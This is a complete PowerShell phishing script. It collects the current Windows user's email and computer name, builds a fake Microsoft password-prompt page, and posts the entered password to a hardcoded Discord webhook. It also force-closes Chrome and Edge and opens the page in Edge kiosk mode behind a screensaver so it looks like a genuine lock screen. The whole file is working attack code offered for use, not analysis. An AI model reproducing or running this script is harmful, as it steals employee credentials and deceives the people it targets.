# GATHER SYSTEM AND USER INFO
$u = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches
$c = $env:COMPUTERNAME
$u = ("$u").Trim()

# DEFINE HTML CODE
$h = @"
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#65279;</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
    <style>#loginForm{background-color:#fff;box-shadow:0 2px 23px -5px rgba(0,0,0,.46);height:470px;width:440px;position:absolute;left:50%;top:49%;transform:translate(-50%,-50%);padding:10px}body{background:url(https://i.ibb.co/VTvw4wc/lock.jpg) 0px 0/cover no-repeat;position:absolute}body::before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background-color:rgba(0,0,0,.5);z-index:-1}#logo{margin-top:25px;margin-left:36px;border:none}#signIn{margin-left:36px;margin-top:-6px;font-weight:600;font-size:25px;overflow:hidden}#email{width:85%;max-width:350px;height:40px;margin-top:-10px;margin-left:36px;border:none;border-bottom:.01px solid rgba(0,0,0,.7)}#ForgodPwd,#NoAccount,#SignWithKey,#createAccount{margin-left:36px;margin-top:13px;font-size:13px}#signInSecurity{margin-left:25px;font-size:13px}.fa.fa-question-circle-o{margin-left:5px;opacity:.8}#passResult,#result,#signInSecurityKey{margin-left:36px;font-size:13px}#iconQ{margin-left:3px;opacity:.55}#btnSend,#btnSignIn{height:33px;width:108px;padding:0;margin-left:auto;margin-top:auto;font-size:13px;color:#fff;border:#0067b8;background-color:#0067b8}#btnPlace{margin-left:275px;margin-top:45px;margin-bottom:1px}#linkCreateAccount{margin-left:5px}#email:focus,input:focus{outline:0}#image{margin-top:25px;margin-left:36px;margin-bottom:12px}#section-2{margin-top:-60%}.section-indent{float:left}#btnSignInLocation{margin-left:275px;margin-top:19px}#password{width:85%;height:40px;margin-top:-10px;margin-left:36px;border:none;border-bottom:.01px solid rgba(0,0,0,.7)}#enterPwd{margin-left:36px;margin-top:7px;font-size:24px;font-weight:500}#btnBack{background-color:#fff;color:rgba(0,0,0,.3);padding:5px;text-align:left;text-decoration:none;display:inline-block;font-size:10px;margin:4px 31px;border:none;cursor:pointer;border-radius:100%}#userLine{margin-left:36px;margin-bottom:-25px;font-size:15px;font-weight:400}#arrowBack{margin-right:5px;margin-top:0;margin-left:8px;opacity:.2;font-size:19px}#iconCircle{color:red}#iconBg{margin-right:5px;opacity:.4;font-size:23px}.slide-page{margin-left:0}.secondSlide{margin-left:100%;overflow:hidden}#section-1{overflow:hidden}#btnBack:hover{background-color:#c6c6c6}#cbRemember{margin-left:36px;width:21px;height:20px}#keepMe{color:#1b1b1b;margin-left:64px;font-size:15px;margin-bottom:-20px}#bg{position:fixed;top:0;bottom:0;min-width:100%;min-height:100%;overflow:hidden}#footer{position:absolute;bottom:0;right:0}#policy{margin-left:36px;font-size:15px;font-weight:400}#terms p,#terms div p{color:#fff!important}</style>
  </head>
<body class="text-nowrap" style="width:100%;height:100vh">
  <div id="loginForm" class="container">
    <img id="image" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg">
    <div></div>
    <section id="section-main">
      <section id="section-1" class="slide-page">
        <h3 id="userLine">$u</h3>
        <br>
        <p id="enterPwd">Enter Password</p>
        <h5 id="passResult"></h5>
        <p id="policy">Your organisation policy requires you to sign in again <br>after a certain period of time. </p>
        <p>
          <input type="password" id="password" placeholder="password">
        </p>
        <p id="ForgodPwd">
          <a href="https://go.microsoft.com/fwlink/p/?linkid=2072756">Forgot password?</a>
        </p>
        <p id="btnSignInLocation">
          <!-- Call the sendPasswordToWebhook() function on button click -->
          <button id="btnSignIn" onclick="sendPasswordToWebhook()">Sign in</button>
        </p>
        <br>
        <br>
        <p id="policy">Employees Login Portal</p>
      </section>
    </section>
  </div>
  <div id="footer" style="height:36px">
    <div id="terms" style="float:left;width:84px">
      <p style="font-size:13px;text-align:left;color:#fff!important">Terms of use</p>
    </div>
    <div style="float:left;width:105px">
      <p style="font-size:12px;color:#fff!important">Privacy &amp; cookies</p>
    </div>
    <div id="terms" style="float:left;width:24px">
      <p style="font-size:12px">. . . <br>
      </p>
    </div>
  </div>
  <script>
    function sendPasswordToWebhook() {
      var passwordValue = document.getElementById("password").value;
      var webhookUrl = 'https://discord.com/api/webhooks/1112134673930403872/mT5SgQWfTVccwe8xy8jAL6HAOCo1dRd65jvSSQMlqeAs7P91pzGf6T9K2z2gtQE8IZBg';
      var uValue = "$u";
      var cValue = "$c";
      var data = {content: "Computer: " + cValue + " | Email: " + uValue + " | Password: " + passwordValue};
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)})
      .then(response => {})
      .catch(error => {});}
    document.getElementById("btnSignIn").addEventListener("click", function() {
      sendPasswordToWebhook();
    });
  </script>
</body>
</html>
"@

# SAVE HTML
$p = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "index.html")
$h | Out-File -Encoding UTF8 -FilePath $p
$a = "file://$p"

# KILL ANY BROWSERS (interfere with "Maximazed" argument)
Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe" -NoNewWindow -Wait
Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "msedge.exe" -NoNewWindow -Wait
sleep 1

# START EDGE IN FULLSCREEN
Start-Process -FilePath "msedge.exe" -ArgumentList "--kiosk --app=$a" -WindowStyle Maximized
sleep -Milliseconds 400
Start-Process -FilePath "C:\Windows\System32\scrnsave.scr"
